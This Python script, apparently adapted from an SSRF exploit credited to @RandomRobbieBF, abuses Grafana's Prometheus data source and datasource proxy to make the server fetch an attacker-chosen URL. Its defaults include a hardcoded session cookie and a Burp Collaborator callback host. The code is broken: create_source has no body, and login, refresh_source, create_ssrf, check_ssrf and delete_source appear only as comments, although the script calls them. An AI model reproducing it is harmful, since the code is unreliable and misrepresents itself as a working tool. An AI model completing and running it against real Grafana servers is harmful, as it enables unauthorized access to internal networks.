#!/usr/bin/env python

# This script is used to test a Grafana instance for Server Side Request Forgery (SSRF) vulnerabilities through Prometheus.
# This was originally authored by @RandomRobbieBF.
# Note: The SSRF exploit attempted by this script does not follow redirects.

# Importing the required libraries
import requests
import json
import sys
import argparse
import re
import os.path
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disabling warnings from insecure requests for cleaner output.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Creating a new session object that will persist across requests
session = requests.Session()

# Parsing arguments from the command line
parser = argparse.ArgumentParser()

# The user can optionally provide a session cookie. If not provided, a default value is used.
parser.add_argument("-s", "--session", required=False ,default="9765ac114207245baf67dfd2a5e29f3a",help="Session Cookie Value")

# The URL of the host to be checked for SSRF. It needs to have http or https.
parser.add_argument("-u", "--url", required=False, default="http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net",help="URL of host to check will need http or https")

# The Grafana host URL. This argument is required.
parser.add_argument("-H", "--host", default="http://kubernetes.docker.internal:5000",required=True, help="Host for Grafana")

# Username for the Grafana instance. It's not required by default.
parser.add_argument("-U", "--username", default="",required=False, help="Username for Grafana")

# Password for the Grafana instance. It's not required by default.
parser.add_argument("-P", "--password", default="",required=False, help="Password for Grafana")

# If the user wants to use a proxy for debugging, they can provide it here.
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

# Parsing the arguments
args = parser.parse_args()

# Assigning parsed arguments to variables
ssrf_url = args.url
sessionid = args.session
ghost = args.host
username = args.username
password = args.password

# If a proxy is provided, it's set up as the environment variable for the current session
if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy

# Function to create a source in the Grafana instance.
def create_source(sessionid, ssrf_url,ghost):
	# Preparing the request body and headers
	# The request is sent to /api/datasources endpoint of the Grafana instance
	# If the source with the same name already exists, the script will exit and prompt user to delete it manually.
	# If the source is successfully created, the function will return the ID of the new source.

# Function to refresh the data source in Grafana. The request is sent to /api/datasources/{id} endpoint of the Grafana instance.
# If the source is successfully refreshed, it prints "Refreshed Sources", else, it deletes the source and print the error.

# Function to create a SSRF in the Grafana instance.
# If the SSRF is successfully created, it prints "SSRF Source Updated", else, it deletes the source and print the error.

# Function to check if the SSRF is working by sending a GET request to /api/datasources/proxy/{id}/ endpoint of the Grafana instance.
# If the response status code is not 502, it prints the status code and response body, else, it deletes the source and print the error.

# Function to delete a data source in the Grafana instance. The request is sent to /api/datasources/{id} endpoint of the Grafana instance.
# If the data source is successfully deleted, it prints "Deleted Old SSRF Source", else, it exits the script and print the error.

# Function to log in to the Grafana instance. It sends a POST request to /login endpoint of the Grafana instance.
# If the login is successful, it returns the session cookie, else, it exits the script and print the error.

# If the user has provided a username, it uses the login function to get the sessionid
if username:
	sessionid = login(ghost,username,password)

# If the user has provided a SSRF URL, it creates a source, refreshes the source, creates a SSRF, and checks the SSRF.
if ssrf_url:
	i = create_source(sessionid,ssrf_url,ghost)
	id = str(i)
	refresh_source(ghost,sessionid,id)
	create_ssrf(sessionid,ssrf_url,ghost,id)
	check_ssrf(sessionid,id,ghost,ssrf_url)
